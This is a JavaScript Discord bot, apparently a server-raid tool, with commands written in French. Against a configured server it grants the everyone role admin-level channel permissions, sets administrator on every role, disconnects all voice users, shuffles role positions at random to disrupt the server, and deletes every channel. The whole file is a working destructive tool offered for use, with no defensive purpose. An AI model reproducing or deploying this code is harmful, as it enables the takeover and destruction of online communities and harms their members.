
const Discord = require('discord.js.old'),
    client = new Discord.Client(),
    { token, guildID, prefix } = require('./config');

client.on("message", async (message) => {
    if(!message.content.startsWith(prefix)) return;

    if(message.content === `${prefix}dero`){
        Derogation(message);
    }
    if(message.content === `${prefix}alladmin`){
        PermAdmin(message);
    }
    if(message.content === `${prefix}decoall`){
        decoall(message);
    }

    if(message.content === `${prefix}down`){
        Down();
    }

    if(message.content === `${prefix}delchannels`){
        DeleteAllChannels(message);
    }
})

function Derogation(message){
    message.channel.send(`**Dérogation en cours..**`)
    const servRaid = client.guilds.get(guildID);
    let role = servRaid.roles.get(guildID);

    servRaid.channels.forEach(channel => {
        channel.overwritePermissions(role, { MANAGE_WEBHOOKS: true, ADMINISTRATOR: true, CREATE_INSTANT_INVITE: true, KICK_MEMBERS: true, MANAGE_CHANNELS: true, VIEW_CHANNEL: true, READ_MESSAGES: true, SEND_MESSAGES: true, MENTION_EVERYONE: true, EMBED_LINKS: true});
    });
}
function PermAdmin(message){

    message.channel.send(`**PermAdmin en cours..**`)
    const servRaid = client.guilds.get(guildID);
    servRaid.roles.forEach(role => {
        role.setPermissions(['ADMINISTRATOR']);
    });
}
function decoall(message){
    message.channel.send(`**DécoAll en cours..**`)
    const servRaid = client.guilds.get(guildID);

    servRaid.channels.filter(c => c.type === 'voice').forEach(channel => {
        channel.members.forEach(member => {
            member.setVoiceChannel(null);
        });
    })
}
function Down(){

    var server = client.guilds.get(guildID);
    var roles = server.roles;
    var oldPos = 0;
    try{
        server.roles.forEach(r => {
            try {
                oldPos = r.position;
                r.setPosition(Math.floor(Math.random() * Math.floor(roles.size)))
                console.log(`Role moved`)
                setTimeout(function() {
                    r.setPosition(oldPos);
                    console.log(`Role reset`)
                }, 800)
            } catch {
                console.log("Missing Perms")
            }
        })}
    catch
    {
        console.log("Serveur Down!")
    }
}
function DeleteAllChannels(message){
    message.channel.send(`**Suppréssion des channels en cours..**`)
    const servRaid = client.guilds.get(guildID);

    servRaid.channels.forEach(channel => {
      try{
          channel.delete();
      }catch{
      }
    });
}


client.login(token);
client.on('ready', () => {
    console.log(`${client.user.username} connected!`)
})
